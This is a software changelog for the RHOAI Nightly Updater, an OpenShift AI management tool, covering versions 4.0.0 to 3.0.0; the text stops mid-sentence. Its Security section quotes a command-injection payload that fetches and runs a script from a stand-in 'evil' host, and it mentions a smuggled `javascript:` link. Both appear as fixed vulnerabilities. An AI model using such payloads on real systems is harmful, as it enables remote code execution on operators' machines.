# Changelog

All notable changes to the RHOAI Nightly Updater. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and versions follow
`vMAJOR.MINOR.PATCH`:

- **MAJOR**: the deploy contract changed (`TEMPLATE_REVISION` in
  `deploy/template.yaml`, RBAC, anything that needs the template re-applied).
  Upgrading needs a full redeploy: the release's `install.sh`, or
  `git checkout vX.Y.Z && make upgrade`.
- **MINOR**: features, same template.
- **PATCH**: fixes.

A section reads `- unreleased` until the release commit replaces it with the
release date (`YYYY-MM-DD`); the release guard (`scripts/release.sh check`)
only accepts a tag whose version is the top dated section. See
[CONTRIBUTING.md](CONTRIBUTING.md#releases).

## [4.0.0] - unreleased

- **Requires a full redeploy** (template revision 7; 3.0.0 has revision 5):
  `git checkout v4.0.0 && make upgrade`, or the release's `install.sh`.
  It creates the OAuthClient users now sign in with; everyone signs in again
  once to make changes (they run with your own token, see Changed).

### Added

- **Components: change the DataScienceCluster without the OpenShift
  console.** A tree of every component and sub-component the installed
  DataScienceCluster CRD defines (any depth: `dashboard.standard`,
  `kserve.nim`, `aigateway.modelsAsAService`, ...), each with its value in
  the DSC, the release default (the installed CSV's `alm-examples`) and what
  the operator reports, replaces the Ready/Removed lists. Each value is a
  select limited to the CRD's values; the confirmation lists exactly what
  is deployed or removed, removals run the disable checks first (fail
  closed), and a sub-component set to Managed under a parent that is not is
  offered with its parent. **Differences from the release default** lists
  only real problems (a value the default sets and the DSC leaves unset,
  Managed under a parent that is not Managed, fields the CRD does not
  define), not user choices or values the API server fills in; **Fix**
  adds or removes exactly the reviewed ones. **Reset to the release
  default…**: a soft reset changes in place only what differs, keeping the
  workbench and AI hub namespaces; a hard reset (typed DSC name) deletes the
  DSC and creates the release default with the same name and namespaces,
  after validating the new spec against the live DSC in a dry run; it
  deletes in the foreground, waits up to 10 minutes for the operator's
  cleanup, never removes a finalizer and creates nothing when the old DSC
  is not gone; whatever stops it after the delete, **Finish the hard
  reset** creates exactly the object it planned. A change runs the checks
  its confirmation showed (the toggle is bound to the reviewed plan);
  removing a component that serves a CRD conversion webhook is refused
  with the `oc get` commands that check for its objects. Every change
  is a JSON Patch of only its fields (its `test` operations fail the patch
  when the DSC changed since you looked), after a server-side dry run, with
  `fieldValidation=Strict` and its own field manager
  (`rhoai-nightly-updater-components`, so Clean up never turns it back);
  refused under Argo CD, an ACM policy or Helm, in the gitops profile (which
  shows the tree read-only), and on Managed RHOAI for the hard reset.
  Diagnostics' **disable** fix now uses the same change for any component
  the CRD defines, instead of a fixed list. The hard reset deletes the DSC with your own token (no new
  ServiceAccount RBAC).
- **MaaS: choose the database.** PostgreSQL is customer-provided in the
  MaaS docs, so Set up asks: your PostgreSQL (only Secret
  `maas-db-config` is written; the URL is never shown, logged or kept),
  the MaaS docs' development database (`scripts/setup-database.sh`
  reproduced: one pod, no volume, keys lost when it restarts; the
  default), or a persistent development database on CloudNativePG, now
  labelled as this tool's own option (it is in neither the MaaS nor the
  RHOAI docs). A `maas-db-config` someone else wrote is used as it is; a
  CloudNativePG database an earlier build made is kept and shown as such.
  The dialog lists the development database first, warns while it is
  chosen that its keys are lost whenever it restarts, and marks the
  CloudNativePG option "Not in the MaaS docs". **Change database**
  switches between them for a database this tool set up that runs, while
  nobody else uses MaaS, after you confirm that every API key is lost
  (nothing is preselected; the loss is the dialog's data-loss alert). Set
  up never changes your PostgreSQL's URL: Change database does. Remove
  deletes only what the chosen option created. The development
  database's Secret `postgres-creds` is never read or changed: the tool
  records its UID when it creates it and deletes only that object. The
  connection URL and the development password are redacted, in every
  form, from any message an API server's refusal could quote them in.
  The status warns when the development database's pod was replaced after
  maas-api started (maas-api makes its tables only at startup).
- **MaaS: who can use the published models, and each model's limit.**
  Publish asks for the audience: everyone signed in, or groups and users
  named as your identity provider sends them (MaaS matches them exactly,
  so an OIDC group such as `/admins` works). A group without an OpenShift
  Group is a warning, while you type in the dialog and on the tab with
  the commands that create it. The model's token limit: the docs' premium
  example (100,000 tokens a day, the default) or free example (100 a
  minute), unlimited where the cluster's MaaS offers it (read from its
  MaaSSubscription CRD), or custom token rate limits checked row by row by
  the MaaSSubscription API's rules, with a summary in words. **Change
  limit** and **Change access** edit them in place after a server-side dry
  run; API keys keep working. Published models are adopted as they are
  (an earlier build's 100 tokens a minute reads as the free example). The
  subscription's description names the limits and the audience, so the
  dashboard's API-key dialog reads right. New RBAC (template revision 7,
  SECURITY.md audit): Secret `postgres-creds` delete (only by the UID
  this tool recorded); Deployment `postgres` delete; Service `postgres`
  patch, delete; Groups get (also behind the cluster-admin-only
  `GET /api/resources/maas/groups` the dialog uses).

- **Set up what a feature needs on the cluster, from its tab (backend).**
  `GET /api/resources/prerequisites` reports, per feature, the parts it
  needs on the cluster, every change Set up would make, and why it cannot;
  `POST /api/resources/prerequisites/stream` makes them, after a check and
  a server-side dry run of every write. Pipelines: `aipipelines` Managed.
  MLflow: `mlflowoperator`. Playground: `ogx` and `dashboard`. Models:
  `kserve`, then the cert-manager Operator for Red Hat OpenShift as
  odh-gitops installs it (`cert-manager-operator`, `redhat-operators`,
  default channel, no AWS role ARN), then a wait until KServe sees it.
  Connectivity Link, which KServe also checks for, is reported, not
  installed: whether a model needs it depends on how it is routed. An
  installed or pending cert-manager is used as it is, wherever it is; a
  DataScienceCluster that Argo CD manages is refused. Clean up can turn
  the components back (`components`), last, each only while this tool
  still owns the field and nothing uses it; operators always stay.
- Operator installs reuse the namespace's one OperatorGroup when it gives
  an install mode the package supports (also own-namespace groups), and
  find a Subscription of the package in any namespace before installing.
- New RBAC: `list` on Subscriptions cluster-wide (SECURITY.md, "One-click
  prerequisites").

<!-- Models routing -->
- **Models: choose how a model is reached.** Through the cluster's default
  inference gateway (KServe's default route, as the dashboard deploys), through
  MaaS only (refs `maas-default-gateway`, published at setup; no inference
  gateway needed), through another gateway that already admits the project
  (never changed; MaaS's and the operator's `data-science-gateway` are never
  offered), or only inside the cluster (no route; not authenticated inside the
  cluster). The tab recommends one from the cluster
  (`GET /api/resources/models/exposures`) and says why. The inference gateway
  is its own part with its own Set up and Delete: a model setup never creates
  it. Connectivity Link and its Kuadrant CR are in the Models prerequisites
  only when the chosen way goes through a gateway
  (`GET /api/resources/prerequisites?exposure=`).
- **"Can it be called?"** After a model is Ready, the tool sends it one
  minimal request (one-token chat, or one embedding) the way it is reached,
  with the model's own token, and reports "Answers requests" or the exact
  problem: 404 from vLLM (the request's `model` is not the served name),
  404 without a body (the path does not reach the model), 401, 403, 5xx, no
  answer. A setup succeeds only when it answers; **Check again** runs it on
  demand (models action `check`).
- **Stale projects on the inference gateway's list.** A project the tool
  added is taken off the list when its last model on the gateway is deleted
  (Models tab, Clean up), fail closed; the tab names listed projects no model
  uses and projects that no longer exist, with a confirmed **Remove from the
  list** (models action `disallow`).
- New RBAC: `get` on the four model token Secrets `default-name-<model>-sa`
  (SECURITY.md, "Models routing and Can it be called?").
- **View progress on the running-operation alert.** Closing a run's
  progress dialog left only an alert that something was running. While a
  run of the Environment page (a setup, a deletion, samples, Clean up, a
  MaaS change) or Migrate storage goes on with its dialog closed, the alert
  names the run and its step ("Set up Pipelines in dev-project is running:
  step 2 of 3, Set up the S3 storage") and **View progress** opens the same
  dialog again with its steps; the focus returns to the action when it
  closes. An operation started in another tab or by another user opens a
  read-only view of what the server records (who started it, when, its
  latest progress, what it acts on) and, once it ends, how it ended. An
  RHOAI update, install or re-deploy keeps its **View progress** link to
  its progress card on the Status page.

### Fixed (Models routing)

- A model's image pull that fails is waited on (2 minutes, 8 on a node that
  joined in the last 15 minutes) before the setup fails: live, a new ROSA
  node got its pull credentials a few minutes after it joined.
- KServe reporting only Connectivity Link missing no longer blocks every
  model: a model reached only inside the cluster does not need it.
- Review of Models and the prerequisites (before release):
  - Taking a project off the inference gateway's list checks, on every
    plan of the write, that no model there uses the gateway (a write
    planned again after a conflict skipped it). **Remove** runs every check
    and the dry run before its write, says when the project is not on the
    list, and refuses when the models, the Gateway or KServe's
    configuration cannot be read. Projects this tool added whose namespace
    was deleted go off the list at the next Models change or Clean up.
  - Clean up turns a component back only with the `resourceVersion` of the
    read its checks were made on, and checks again after a conflict. The
    ownership check notices someone who *changed* the component, not one
    who set it to Managed again; the dialog says the in-use check covers
    that.
  - Only gateways whose token checks the tool can read are recommended
    (in `openshift-ingress`, not `opendatahub.io/managed=false`); others are
    an explicit choice. KServe's default gateway is never assumed when its
    configuration cannot be read or names none.
  - **Can it be called?** also sends the request without a token through a
    gateway: an answer fails the check (**Answers without a token**). A
    model that cannot be called **Needs attention** on its card;
    **Check again** runs in place; results read "Checked 2 minutes ago"
    and no longer repeat themselves; older vLLM's 404 is recognised.
  - A ready wait that ends during a failing image pull keeps the pull
    advice. A new OperatorGroup is planned only in an install mode the
    package supports.
  - Plainer Models tab: **Model access** before the cluster checklist, each
    way described for the caller, unavailable ways say why with a link to
    fix it, its own next steps for a model reached only inside the cluster,
    the model's card first when it does not use the gateway, and the
    deletion and Clean up dialogs say when a project goes off the
    gateway's list. Prerequisites on every tab: **Needed on the cluster
    first** with Set up as the primary action, a grey Waiting, one ordered
    CLI script, the plan open in **Install and turn on**; the Overview
    plans Models for the recommended inference gateway, and a feature that
    reads Ready while its prerequisites are not needs attention.
<!-- /Models routing -->

### Fixed

- **Components: MaaS is no longer removed by a change that does not know
  it is in use.** Setting `aigateway` or `aigateway.modelsAsAService` to
  Removed, a soft or hard reset (the release default leaves both
  Removed), Diagnostics' disable fix and the version-matched repair all
  passed their checks on a cluster where this tool had set MaaS up and
  published a model (live, RHOAI 3.6), and would have taken maas-api and
  the gateway policies away: every published model and API key stops
  working. Such a change is now refused while any MaaSModelRef,
  MaaSSubscription or MaaSAuthPolicy exists or this tool's MaaS record
  shows a setup or a publication, naming them and pointing at **Clean up
  MaaS** on the MaaS tab (or keep `aigateway` Managed); a read that fails
  refuses too, and so does a list that answers 404 while discovery serves
  the MaaS API (the lists use the version discovery reports, never a
  `v1alpha1` fallback). Clean up MaaS and Change database check others'
  MaaS objects the same way. A hard reset that brings MaaS back warns that it is down
  meanwhile. No new RBAC: the lists Clean up MaaS already reads.
- **Resets keep the components you turned on.** Both reset dialogs offer
  "Keep the components you turned on (N): ...", checked by default: what
  is Managed (or Unmanaged) and deployed in the DSC but off in the release
  default keeps its value, with the parents it needs, and the plan lists
  it as "Kept: ... (you turned these on)"; toggling the option plans the
  reset again. Unchecked, the reset is the pure release default and the
  MaaS guard applies. The API takes `keepEnabled` on the plan (query) and
  on both reset requests (required; bound to the reviewed plan's token).
- Helper and error text under a field inside a radio's body (Change
  database's connection URL, custom token rate limits, the groups and users
  of Publish and Change access) sat on the field's edge: the radio group's
  stacked layout pulled it up. It now has PatternFly's spacing, as do the
  fields of Install a different build, whose helper text touched them.
- Change database and Remove MaaS name the database without nested
  parentheses: "...then permanently deletes the current one, the persistent
  development database (CloudNativePG)."
- A model set up on the Models tab **Through MaaS only** is published as
  part of its setup, and its lifecycle now follows that. **Unpublish**
  leaves it with no route (only inside the cluster), as it was set up;
  before, it put the model on KServe's default gateway, which nobody chose,
  and said it routed "as before publishing". **Delete** on the Models tab
  unpublishes it first, in the same operation; before, it refused and
  asked for Unpublish on the MaaS tab. When that unpublish stops, the model
  is not deleted. A model published on the MaaS tab still has to be
  unpublished there first.
- A model with no route of its own goes back to none when it is
  unpublished, in every case: a setup **Through MaaS only** whose publish
  stopped before it recorded anything (its Unpublish put it on KServe's
  default gateway, Delete refused it, and **Set up** again did not publish
  it), and a model set up **Only inside the cluster** and then published
  on the MaaS tab (Publish wrote only the gateway, so KServe made no route
  and the model stayed partly published). Publish now gives such a model
  its route on the MaaS gateway and records that it had none; Unpublish
  again after a route removal that stopped waiting says the model has no
  route. Models' Delete and Set up keep the log lines of the unpublish or
  publish they run.
- A model's image pull through a mirror where one source answers
  "manifest unknown" and another refuses the node's credentials is still
  waited on, but once the wait ends the setup and the Models tab offer
  **Use the newest released Red Hat image** again, worded as a
  possibility ("may not be published").

### Changed

- **Every change runs with your own OpenShift token.** Users sign in
  through the install's own OAuthClient `<APP_NAME>-<NAMESPACE>`
  (`grantMethod: auto`, so no "Authorize Access" page; oauth-proxy
  `--client-id`, `--client-secret-file`, `--scope=user:full`) instead of
  through the app's ServiceAccount, which the OAuth server limits to
  `user:info user:check-access`. `install.sh` creates the client and its
  Secret `<APP_NAME>-oauth-client` (an upgrade from 3.x too; uninstall
  deletes the client and revokes its sign-ins); the chart's `profile: full`
  does it with a Sync and a PostSync hook (`gitops.oauthClient.enabled`).
  The chart's gitops profile (its default) keeps the 3.x sign-in through
  the ServiceAccount (`user:info user:check-access`, no OAuthClient):
  nothing there acts with your token, so its session cannot change the
  cluster and nobody signs in again
  ([GITOPS §11](docs/GITOPS.md#sign-in-in-the-gitops-profile)). The API server
  checks each change against your RBAC and its audit log names you. Before
  a change is accepted, the app checks that your sign-in can carry it (scope
  `user:full`, not expiring within the operation's deadline); otherwise
  "Log out and log in again". **After the upgrade everyone signs in again
  once to make changes** (the old session's token can only identify you).
  A 401 or 403 to your token mid-operation says your sign-in or your
  permissions stopped it ([UPGRADING](docs/UPGRADING.md#upgrade-to-v400-changes-run-with-your-own-token),
  [RUNBOOK §4](RUNBOOK.md#4-sign-in-and-permissions)).
- **Playground: Set up can add Models as a Service models again**, with
  your own token (as in the dashboard); 3.0.1 had turned that off because
  it ran with the ServiceAccount's. The status still uses the
  ServiceAccount's token and never reaches MaaS.

- Final review of the Environment page's wording (before release): a
  model published on the MaaS tab reads **Through MaaS while published**
  and shows its **MaaS address**; a model that cannot be called says so
  once (the alert keeps the message and **Check again**); the MaaS words
  are the dashboard's (**authorization policy**, **MaaS governance**,
  the subscription's display name) and one name per shared part
  (**Connectivity Link instance (Kuadrant)**, **MaaS gateway**,
  **Database**); **Clean up MaaS** as on every other tab; a shared part
  with a warning needs attention, and a part waiting for another is a
  grey **Waiting**; MaaS dialogs name the model by its display name, and
  messages no longer quote project names; the capacity warning uses GiB;
  the Overview's in-app step reads **Show issue in &lt;project&gt;**;
  `/environment` opens the Environment page.

### Security

- **The ServiceAccount is read-mostly.** It keeps the reads every
  signed-in user's pages need, the app's own ConfigMaps, and the background
  MaaS prune job's named writes (delete the tool's MaaSModelRefs, update or
  delete its MaaSSubscription and MaaSAuthPolicy, patch the MaaS gateway and
  its options; the job now only updates existing objects and never
  creates). Gone: every create outside its namespace, every write on
  Secrets, ServiceAccounts, RBAC, namespaces, workloads, Subscriptions,
  CSVs, InstallPlans, CatalogSources, webhooks, CRDs and
  DataScienceClusters (also 4.0.0's own `delete` for the hard reset), so a
  leaked token no longer has cluster-admin reach (130 rules, 123 write verb
  tuples before; about 60 rules after, writes by name only). Tests derive
  the template from the ServiceAccount's own entry points and fail when a
  change could reach its token ([SECURITY.md](SECURITY.md#serviceaccount-rbac)).
  Residual: `get` on four named Secrets and the cluster pull secret, and
  `patch` on `maas-default-gateway` (the prune job).
- **The session cookie now carries a full user token** (encrypted with
  the cookie secret, for up to 23 hours): Secrets `<APP_NAME>-proxy` and
  `<APP_NAME>-oauth-client` are as sensitive as the users' sign-ins; no
  `--cookie-refresh` (broken in openshift/oauth-proxy, and it can log the
  token); the token is never logged, stored or shown
  ([SECURITY.md: Threat model](SECURITY.md#threat-model-of-the-user-token-400)).
- **The OAuthClient does not outlive the install.** The OAuth server
  answers the implicit flow for any client, so with `grantMethod: auto` a
  client left behind would hand a signed-in user's `user:full` token to
  whoever later serves its redirect host (a project admin's Route with the
  freed host); the client secret does not stop that. The client now
  allows exactly the scope `user:full` (`scopeRestrictions`), and is
  deleted with its sign-ins revoked by `install.sh uninstall` (which now
  stops before deleting the namespace when it cannot delete the client), by
  `make rollback` to a 3.x template, and by a new PostDelete hook when the
  chart's Argo CD Application is deleted (Argo CD 2.10 or later).
  **Deleting the namespace by hand leaves the client and its sign-ins**
  (live-checked): run `install.sh uninstall` afterwards (it works once the
  namespace is gone, live-checked), or `oc delete oauthclient
  <APP_NAME>-<NAMESPACE>` and `oc delete oauthaccesstokens --field-selector
  clientName=<APP_NAME>-<NAMESPACE>`
  ([SECURITY.md](SECURITY.md#the-oauthclient-400)). Test builds of 4.0.0
  gave the client an ownerReference to the Namespace; the garbage collector
  did not delete the client with its namespace (live, after more than 3
  minutes), so the client has none, and deploy, upgrade and the chart's
  hook remove one an earlier build left.
- **Revoking a sign-in takes about a minute.** After `oc delete
  oauthaccesstokens --field-selector clientName=...` the API server kept
  accepting the revoked token for about a minute (live; the same for `oc`
  and the dashboard), then the app answered 401 and showed "Your session
  expired" ([SECURITY.md](SECURITY.md#revoking-a-sign-in)). Changes stop at
  once: the session check now refuses a sign-in whose own token object is
  gone, instead of treating it as unreadable and going ahead.
- **One install no longer takes over another's OAuthClient.** Its name
  `<APP_NAME>-<NAMESPACE>` is the same for app `a-b` in namespace `c` and app
  `a` in namespace `b-c`, and the apply forced its fields over. The client
  now carries the app name and namespace as labels; install, upgrade,
  rollback and the chart's hook refuse, before any change, a client of that
  name that is not this install's, and uninstall leaves it and its sign-ins
  alone.

- **Models' copy-paste commands could run what a project editor wrote.**
  The name a model serves (`spec.model.name`), which anyone who can edit
  its project sets on any model of a catalog name, went unquoted into the
  Use it commands' request bodies, so a name such as
  `x"}'; curl https://evil/p|sh; echo '` ran when a cluster-admin pasted
  them. The commands now build every body as JSON and single-quote it
  (names elsewhere are quoted unless plain), and the backend shows, puts
  in commands and calls a model with a served name only when it is
  letters, digits and `. _ / : -`; otherwise Use it shows no commands and
  says why.
- Commit links on the Components page (Deployments) and in a build's
  components (Build Explorer, catalog contents) come from the image's
  labels, which whoever builds the image chooses. They are now links only
  for `https://github.com/<owner>/<repo>`, as elsewhere in the app; before,
  a `javascript:` URL in a label became a clickable link. The backend keeps
  only https repository URLs from labels, and reads labels only for
  images whose reference starts with `registry.redhat.io/rhoai/`,
  `quay.io/rhoai/` or `quay.io/opendatahub/` (it matched those anywhere in
  the reference, and labels are always read from quay.io).
- The update notice's install command checks the download before anything
  runs: `curl ... && echo '<sha256>  install.sh' | sha256sum -c - && less
  install.sh && bash install.sh`. The backend reads the SHA-256 from the
  new release's own notes (the `install.sh SHA-256` line), through the
  GitHub or GitLab releases API, anonymously and cached like the release
  list. Without it, the notice asks you to compare with the release notes.
- The oauth-proxy container runs with a read-only root filesystem, as the
  app container already did (part of template revision 7). oauth-proxy
  writes no files.
- The Content-Security-Policy adds `base-uri 'none'`, `form-action 'self'`,
  `frame-ancestors 'none'` and `object-src 'none'`, which `default-src`
  does not cover.
- S3 storage, **Copy as environment variables**: every value is
  single-quoted (`AWS_SECRET_ACCESS_KEY='...'`), so keys set at a first
  setup with `$`, backticks or spaces cannot run or split when pasted
  into a shell.
- **Log out** now ends the updater's session: it opens oauth-proxy's
  `/oauth/sign_out`, which clears the session cookie. Before, it opened
  the sign-in page and the session stayed. The OpenShift login itself
  stays (SECURITY.md, Sessions): log out of the console to end it.

## [3.0.1] - unreleased

### Security

- The updater's ServiceAccount token no longer reaches the Models as a
  Service gateway. The Playground's status and Set up called dashboard
  gen-ai endpoints that pass the caller's token on to the MaaS gateway,
  which the editors of published projects can attach routes to. The tab
  now reads MaaS models from their MaaSModelRefs (only those a
  MaaSSubscription offers), and Set up adds only the project's own models,
  with tracing, guardrails and vector stores off: add a MaaS model in the
  dashboard's playground, signed in as yourself.
- Migrate storage writes the storage's S3 keys only into the projects of
  pipeline servers this tool recorded, or whose project you confirm in the
  dialog. A pipeline server's label was enough before, and a project's
  editors can set it. Pipeline servers set up before 3.0.1 are listed for
  confirmation the first time.
- The MaaS gateway stops admitting projects whose publication is gone (the
  project was deleted, or the model is not the one published): the
  updater checks at start and every 5 minutes (while no other operation
  runs) and at the start of every MaaS, Models or Clean up operation. The
  tool's access policy and subscription stop listing them, and the tool's
  model reference of a remade model is deleted; the MaaS tab names them
  until then, and warns when its record of models cannot be read. A
  deleted project's name could otherwise be recreated by anyone allowed to
  create projects and given routes on the MaaS gateway.
- Errors from writing the node pull secret no longer show the credential
  when the API server quotes what it was sent.
- `GET /api/update-check` now requires a signed-in user, like every other
  API read.
- The MaaS tab's CLI commands quote catalog channel names.
- CI, GitLab: kaniko no longer gets the Quay push credentials
  (`QUAY_USER`/`QUAY_TOKEN`). `build-main` built only a tarball but was
  logged in, and the build's `RUN` steps (`npm ci` install scripts,
  `go mod download`) could read that login. The manual `build-branch` job
  no longer pushes with the release credentials either: it pushes to a
  repository of its own (`BRANCH_IMAGE`, with `QUAY_BRANCH_USER` and
  `QUAY_BRANCH_TOKEN`), or builds only. The release credentials can now be
  protected variables; CONTRIBUTING.md lists the GitLab and Quay settings
  that keep `:main`, `:latest` and the release tags safe.
- CI: `:main` is always the main pipeline's own image. `publish-main` kept
  an existing commit tag whose revision label named the same commit and
  moved `:main` to it, so a workstation build (`make push` pushed the same
  8-character tag, even from a tree with uncommitted changes) could become
  `:main`. It now pushes its own image as `:main`, and stops when the
  commit tag holds anything but its own image or the release image of the
  same commit. `make build` and `make push` use `dev-<commit>` tags
  (`-dirty` with uncommitted changes), `make push` refuses a tree with
  uncommitted changes, and a commit-like `TAG` is not pushed.

### Fixed

- The Playground tab's command for a Models as a Service model names the
  model's subscription (this tool's when the model is offered under it).
  Without one, the dashboard cannot mint the MaaS key it calls the model
  with, and the playground answered 500. The dashboard's own playground
  sends it.
- `dev.sh` stops everything it started on Ctrl-C, kill or a closed
  terminal (also after `kill -9`), and refuses a second copy for the same
  checkout.

### Changed

- Links to the RHOAI dashboard open the matching section page, not a
  project's details page: a project's models open its Deployments page
  (`/ai-hub/models/deployments/internal/<project>`), and MaaS opens MaaS
  governance (`/maas/maas-governance`). Pipelines (`/develop-train/pipelines/definitions/<project>`)
  and the playground (`/gen-ai-studio/playground/<project>`) already did.
- MLflow links open MLflow in the dashboard too: **Open MLflow experiments**
  goes to `/develop-train/mlflow/experiments`, a project's link adds
  `?workspace=<project>`, and a sample's link opens its experiment's runs
  (`/develop-train/mlflow/experiments/<id>/runs`), as the dashboard's own
  links do. Without the dashboard's address they open MLflow's own UI as
  before.
- Release notes (GitLab and GitHub) open with the install and upgrade
  block (download, checksum, dry run, install), then the CHANGELOG
  section; 3.0.0's long section had buried it.
- Internal, CI only: faster pipelines with every check kept. The frontend
  checks run as three parallel jobs (checks, tests, build), the GitLab Go
  and golangci-lint jobs keep their module and build caches, and GitLab's
  image jobs skip the Containerfile's checks (`RUN_CHECKS=false`), which
  the pipeline's test jobs already ran on the same commit. GitLab pulls
  Docker Hub images from `mirror.gcr.io`, Google's public cache of Docker
  Hub, after Docker Hub's anonymous pull limit stopped jobs; the images stay
  pinned by digest. A project variable `DOCKER_HUB` points it elsewhere
  (`docker.io`, or GitLab's Dependency Proxy).

## [3.0.0] - 2026-11-18

### Added

- **MaaS: set it all up from the tab.** Set up now does every step of the
  MaaS install docs that is missing, in their order, after one
  confirmation that lists each change: Red Hat Connectivity Link
  (`redhat-operators`, the channel whose release meets the docs' minimum
  for RHOAI 3.6, read from the catalog, set to deny traffic when rate
  limiting fails as the docs recommend) with its Kuadrant CR, the
  CloudNativePG operator (`certified-operators`, in `cnpg-system`, not
  `openshift-operators`, where an install can pull an OSSM upgrade that
  breaks the gateway), the AI gateway's
  infrastructure namespace, the database, the gateway, Authorino TLS (the
  docs' `setup-authorino-tls.sh`), and `aigateway` with
  `modelsAsAService` in the DataScienceCluster. What exists is used as it
  is; a failed run continues where it stopped. The tab is a checklist:
  each part says what Set up will do, offers its own fix where it has one
  (**Upgrade Connectivity Link**, along OLM's path one channel at a time
  and with Authorino TLS restored afterwards; **Raise the memory limit**,
  only after the Kuadrant operator was OOMKilled; **Deny traffic when
  rate limiting fails**, for a Connectivity Link installed without it;
  **Configure Authorino TLS**; **Remove the old tier policies**), and keeps the commands under
  **Do it from the CLI instead**. Remove keeps the shared pieces
  (Connectivity Link, Kuadrant, Authorino TLS, CloudNativePG), restores
  `aigateway`, and deletes the infrastructure namespace it created only
  when nothing else is in it. New RBAC (template revision 5, SECURITY.md
  "MaaS one-click setup").

- **Pipelines: set up as the RHOAI dashboard sets one up.** The pipeline
  server is named `dspa`, the only name odh-notebook-controller gives
  workbenches a pipeline config for, so Elyra pipelines from a workbench
  work. It carries the dashboard's settings (`managedPipelines`, `mlflow`,
  when the installed CRD declares them), its S3 Secret is owned by it, and a
  dashboard S3 Connection `rhoai-nightly-updater-s3` ("Shared S3 storage
  (RHOAI Nightly Updater)") lets workbenches and model deployments use the
  shared storage. Deleting the server, here or in the dashboard, deletes
  both. A server an earlier version named `nightly-dspa` keeps working; the
  Pipelines tab explains the workbench limitation and offers **Recreate
  with the standard name** (its run history is lost; S3 artifacts stay).
  Setup now refuses a namespace that is not a Data Science project instead
  of creating it, and a server is reported stuck after 5 minutes only while
  its API server is not ready, as the dashboard does. New RBAC: Secret
  `rhoai-nightly-updater-s3` (`get patch delete`).
- **Models and MaaS as the RHOAI 3.6 dashboard makes them.** Each model
  gets the dashboard's token authentication (ServiceAccount `<model>-sa`
  that may only get it, Role, RoleBinding, token Secret
  `default-name-<model>-sa`, all owned by the model), so the dashboard
  lists its token and its Edit keeps authentication on; Use it reads that
  token. A model is the tool's only when its UID is in the tool's record
  (a model a pre-release 3.0.0 build set up is not: delete it with `oc`
  and set it up again). Publishing takes the model out of Gen AI studio's
  AI assets (restored on Unpublish), and the MaaSModelRef is owned by the
  model, with the catalog's name and description. Qwen3's chat template
  JSON has no spaces; models request ephemeral storage for their download;
  setup warns about a full project ResourceQuota; the Models tab says what
  the dashboard shows for a model no hardware profile fits. RBAC:
  ServiceAccounts, Roles, RoleBindings `create` and named `get delete`,
  the token Secrets' names `delete`, ResourceQuotas `list` (SECURITY.md).

- **Models tab: a catalog of four CPU models.** A model picker offers
  SmolLM2 135M Instruct (smoke test), Qwen2.5 0.5B Instruct (the default),
  Qwen3 1.7B (tool calling; thinking off by default) and Granite Embedding
  125M English (768 dimensions), each pinned to a Hugging Face commit, with
  what it is for, what it reserves and its download; a model no worker has
  room for is disabled with the reason. A project can hold several; Set up,
  Delete and Use it act on the chosen one (embeddings get a
  `/v1/embeddings` command, Qwen3 tool-calling and thinking commands; the
  thinking command streams, because the cloud load balancer closes a
  connection that sends nothing for 60 seconds). Memory requests and limits
  come from each model's use measured live on RHOAI 3.6: SmolLM2 4 / 5 GiB,
  Qwen2.5 6 / 8 GiB, Qwen3 12 / 14 GiB, Granite 3 / 4 GiB. The
  storage-initializer skips ONNX and PyTorch files. The Playground adds
  this tool's embedding model as an embedding model (768 dimensions); MaaS
  publishes the chosen chat model (`MaaSRequest.model`). RBAC: the
  LLMInferenceService rule names the four models and the MaaSModelRef rule
  the three chat models (SECURITY.md).

- **Environment page, Playground tab.** One Set up asks the installed RHOAI
  dashboard's own gen-ai API to create its Gen AI playground in a project,
  with the project's ready chat models, as a click in its Gen AI studio does
  (nothing of the playground is copied into this tool); Delete asks it to
  remove it. Only the playground server this tool requested (its recorded UID) is deleted; one made in
  the dashboard, also after deleting this tool's, shows as not managed. Clean up everything deletes the
  playgrounds before the models. The calls use the updater's ServiceAccount
  token; new ClusterRole rules for the dashboard's install and delete are
  audited in SECURITY.md. The Overview gets a Playground row.
- **Environment page, Models tab.** One Set up deploys a small chat model
  (Qwen2.5 0.5B Instruct, vLLM on CPU, LLMInferenceService
  `qwen25-05b-instruct`) in a data science project, and the cluster's
  inference gateway (Gateway `openshift-ingress/openshift-ai-inference`)
  it is reached through, unless one exists; each has its own removal, and
  Clean up everything deletes the models, then the gateway. The CPU preset
  is found at run time; on a nightly cluster that cannot pull the preset's
  image, the newest released Red Hat image is used (`VLLM_CPU_IMAGE`
  overrides it). "Use it" calls the model with the model's own token
  (the dashboard's token authentication, below), never the user's. The
  Overview gets a Models row.
- RBAC (template revision 5): Roles in `openshift-ingress` and
  `openshift-ingress-operator` (new template parameters `INGRESS_NAMESPACE`,
  `INGRESS_OPERATOR_NAMESPACE`) and named ClusterRole rules for the
  GatewayClass, LLMInferenceServices and their presets, KServe's ConfigMap
  `inferenceservice-config` (read, by name) and Gateways (list, read-only);
  each is audited in
  SECURITY.md.

### Changed

- **The S3 admin UI has a password of its own.** It was the S3 secret
  key, which every pipeline project's copy of the keys holds. Setup and
  Repair write a random password into `seaweedfs-s3-credentials` only;
  storage set up earlier asks for Repair, which keeps the S3 keys.

- MLflow set up by this tool uses the MLflow operator's own resource
  defaults (on 3.6: requests 1 CPU / 2 GiB, limits 4 CPU / 3 GiB) instead
  of a 2 GiB limit, which got its 8-worker server OOMKilled while MLflow
  generated demo data.
- **Environment page, for someone new to it.** What a feature needs shows
  before Set up: a DataScienceCluster component that is not Managed (with
  Open Components), no data science project (with a link to the
  dashboard's Projects page), or a namespace `seaweedfs` that is someone
  else's; Set up stays disabled with the reason under it, and every Set
  up first checks all its parts, so it never creates half a feature. The
  backend refuses the same way (the operator keeps a removed component's
  CRD, so a pipeline server or MLflow would be created and never start).
  Set up names what it sets up ("Set up Pipelines in dev-project"), its
  confirmation leads with the outcome ("On the cluster: S3 storage (20
  GiB)... Takes 1 to 3 minutes") with the objects under Details, and every
  change (Set up, Delete, Repair, a PR deploy, Clean up) runs in one
  dialog with its steps and outcome; closed early, a notification brings
  it back. Problems read in words ("The S3 storage's image can't be
  downloaded"), with the fix and View logs on the alert and the pod's
  reasons under Technical details.
- **Clean up.** Each tab, and the Overview ("Clean up everything"),
  deletes what this tool created as one confirmed operation with a
  checkbox per part: the pipeline servers in every project, the S3
  storage (optionally namespace `seaweedfs`), MLflow. It runs on the
  server as one operation (`POST /api/resources/cleanup/stream`, one
  lock and one rate-limit slot) and stops at the first part that fails.
  Per-part Delete and Repair moved from the collapsed Tear down section
